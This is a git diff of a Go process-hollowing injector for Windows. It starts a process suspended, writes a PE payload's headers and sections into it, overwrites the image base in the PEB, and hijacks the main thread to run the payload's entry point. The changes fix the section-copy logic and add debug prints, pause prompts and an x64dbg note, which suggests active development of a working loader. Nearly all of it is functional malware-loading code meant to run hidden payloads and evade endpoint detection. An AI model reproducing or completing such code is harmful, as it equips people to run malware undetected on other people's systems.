@@ -37,6 +37,7 @@ is seen as highly suspicious by EDRs:
 var targetProcess *uint16
 var startupInfoEx StartupInfoEx
 var pThreadAttribList PROC_THREAD_ATTRIBUTE_LIST
+var securityAttrs windows.SecurityAttributes
 var userInput string
 
 const CREATE_SUSPENDED uint32 = 0x00000004
@@ -61,6 +62,8 @@ func init() {
 	// Setup the StartupInfoEx.
 	startupInfoEx.Cb = uint32(unsafe.Sizeof(startupInfoEx))
 	startupInfoEx.AttributeList = &pThreadAttribList
+	securityAttrs.Length = uint32(unsafe.Sizeof(securityAttrs))
+	securityAttrs.InheritHandle = 1
 }
 
 // Create the hollowed process.
@@ -84,7 +87,7 @@ func main() {
 	err = CreateProcess(
 		nil,
 		targetProcess,
-		nil,
+		&securityAttrs,
 		nil,
 		false,
 		CREATE_SUSPENDED,
@@ -98,6 +101,9 @@ func main() {
 	}
 
 	fmt.Printf("Process created in suspended state --> %+v\n", procInfo)
+
+	fmt.Printf("Clcik enter proceed ...\n")
+	fmt.Scanf("%s", &userInput)
 
 	// 2. Write the PE payload into the remote process.
 	pRemoteAddress, err := VirtualAllocEx(
@@ -118,14 +124,14 @@ func main() {
 	}
 
 	// Convert payloadNTHeaders to *byte for lpBuffer *byte in WriteProcessMemory.
-	ntHeadersBuf := new(bytes.Buffer)
-	err = binary.Write(ntHeadersBuf, binary.LittleEndian, payload.NtHeader)
+	allPayloadBytes := new(bytes.Buffer)
+	err = binary.Write(allPayloadBytes, binary.LittleEndian, payload.Bytes)
 	if err != nil {
 		log.Fatal("Error converting payloadNTHeaders to *byte: ", err)
 	}
 
-	ptrToFirstByte := &ntHeadersBuf.Bytes()[0]
-	sizeOfNtHeadersUint := uint32(len(ntHeadersBuf.Bytes()))
+	ptrToFirstByte := &allPayloadBytes.Bytes()[0]
+	sizeOfNtHeadersUint := payload.NtHeader.OptionalHeader.SizeOfHeaders // combined size of all headers in the PE file, including the DOS header, PE header, and section headers.
 	uintptrSizeOfNtHeadersUint := uintptr(sizeOfNtHeadersUint)
 	actualSizeWrittenUintPtr := new(uintptr)
 
@@ -140,11 +146,11 @@ func main() {
 		log.Fatal("Error writing NT headers to the remote process: ", err)
 	}
 
-	if *actualSizeWrittenUintPtr != uintptr(ntHeadersBuf.Len()) {
+	if *actualSizeWrittenUintPtr != uintptrSizeOfNtHeadersUint {
 		log.Fatal("Wrote incorrect number of bytes to the remote process")
 	}
 
-	fmt.Printf("Wrote %d bytes to the remote process, expected %d\n", *actualSizeWrittenUintPtr, ntHeadersBuf.Len())
+	fmt.Printf("Wrote %d bytes to the remote process, expected %d\n", *actualSizeWrittenUintPtr, uintptrSizeOfNtHeadersUint)
 
 	// For each section (e.g. .text, .rdata, .data, .bss, .idata, .edata, .rsrc, .reloc)
 	// in the payload, write the section data to the remote process.
@@ -152,27 +158,30 @@ func main() {
 		// Get the current section header containing the pointer to the section data
 		section := payload.SectionHeaders[i]
 
-		// Seek to the section data
-		_, err = payload.Reader.Seek(int64(section.PointerToRawData), 0)
-		if err != nil {
-			log.Fatal("Error seeking to section data: ", err)
-		}
-
-		// Read the section data
-		sectionData := make([]byte, section.SizeOfRawData)
-		_, err = payload.Reader.Read(sectionData)
+		/*
+			We now need to write the section data to the remote process.
+			First allocate a buffer for the data --> sectionRawData
+			Next, seek to the start of the raw data, section.PointerToRawData is an integer offset from the image base where the raw data starts
+			Finally, read the section data into sectionRawData
+		*/
+		sectionRawData := make([]byte, section.SizeOfRawData)
+		payload.Reader.Seek(int64(section.PointerToRawData), 0)
+		_, err = payload.Reader.Read(sectionRawData)
 		if err != nil {
 			log.Fatal("Error reading section data: ", err)
 		}
 
+		// Print hex of sectionRawData
+		fmt.Printf("Section %s first 8 bytes --> %x\n", section.Name, sectionRawData[:8])
+
 		// Write the section data to the remote process
 		pRemoteSectionAddress := pRemoteAddress + uintptr(section.VirtualAddress)
 		err = WriteProcessMemory(
-			procInfo.Process, // Handle to the remote process
-			pRemoteSectionAddress,
-			&sectionData[0],
-			uintptr(section.SizeOfRawData),
-			actualSizeWrittenUintPtr,
+			procInfo.Process,               // Handle to the remote process
+			pRemoteSectionAddress,          // Ptr to the base address in the remote process
+			&sectionRawData[0],             // Ptr to the local buffer containing data to be written to the remote process
+			uintptr(section.SizeOfRawData), // number of bytes to be written
+			actualSizeWrittenUintPtr,       // actual number of bytes written [out]
 		)
 		if err != nil {
 			log.Fatal("Error writing section data to the remote process: ", err)
@@ -189,6 +198,15 @@ func main() {
 	}
 
 	fmt.Printf("Thread context: %+v\n", threadContext)
+
+	/*
+		To verify the thread context values, pop open x64dbg and attached to the process
+		Find the threads tab and select the main thread
+		In the CPU window, you'll see the RCX register which matches the ThreadContext.Rcx value
+	*/
+
+	fmt.Printf("Clcik enter proceed ...\n")
+	fmt.Scanf("%s", &userInput)
 
 	// Get the offset of the PEB from the RDX register in the thread context.
 	pebLocation := threadContext.Rdx
@@ -209,9 +227,6 @@ func main() {
 	imageBaseAddressOffset := uint64(0x10)
 	uRemoteImageBaseAddress := uintptr(pebLocation + imageBaseAddressOffset)
 
-	ResumeThread(procInfo.Thread)
-	windows.WaitForSingleObject(procInfo.Process, windows.INFINITE)
-
 	// Write the ImageBaseAddress of the payload to the remote process's PEB.
 	err = WriteProcessMemory(
 		procInfo.Process,
@@ -225,6 +240,9 @@ func main() {
 	}
 
 	fmt.Printf("Wrote %d bytes of ImageBaseAddress to the remote process's PEB at 0x%x\n", *actualSizeWrittenUintPtr, uRemoteImageBaseAddress)
+
+	fmt.Printf("Clcik enter proceed ...\n")
+	fmt.Scanf("%s", &userInput)
 
 	// 4. Fix memory permissions.
 	for i := 0; i < int(payload.NtHeader.FileHeader.NumberOfSections); i++ {
@@ -281,12 +299,17 @@ func main() {
 	}
 
 	// 5. Perform thread hijacking to run the payload's entry point.
-	// Context.Rcx = (LPVOID)(pRemoteAddress + pImgNtHdrs->OptionalHeader.AddressOfEntryPoint);
-	threadContext.Rcx = uint64(pRemoteAddress + uintptr(payload.NtHeader.OptionalHeader.AddressOfEntryPoint))
+
+	threadContext.Rcx = uint64(pRemoteAddress) + uint64(payload.NtHeader.OptionalHeader.AddressOfEntryPoint)
+	fmt.Printf("Thread RCX: %+v\n", threadContext.Rcx)
+
 	err = SetThreadContext(procInfo.Thread, &threadContext)
 	if err != nil {
 		log.Fatal("Error setting thread context: ", err)
 	}
+
+	fmt.Printf("Clcik enter proceed (just set threadcontext) ...\n")
+	fmt.Scanf("%s", &userInput)
 
 	// 6. Resume the thread
 	err = ResumeThread(procInfo.Thread)
@@ -297,7 +320,11 @@ func main() {
 	fmt.Println("Thread resumed")
 
 	// Wait for the process to finish
-	windows.WaitForSingleObject(procInfo.Process, windows.INFINITE)
-	fmt.Printf("Process finished\n")
+	event, err := windows.WaitForSingleObject(procInfo.Process, windows.INFINITE)
+	if err != nil {
+		log.Fatal("Error waiting for process to finish: ", err)
+	}
+
+	fmt.Printf("Process finished --> %d\n", event)
 	time.Sleep(5000 * time.Millisecond)
 }
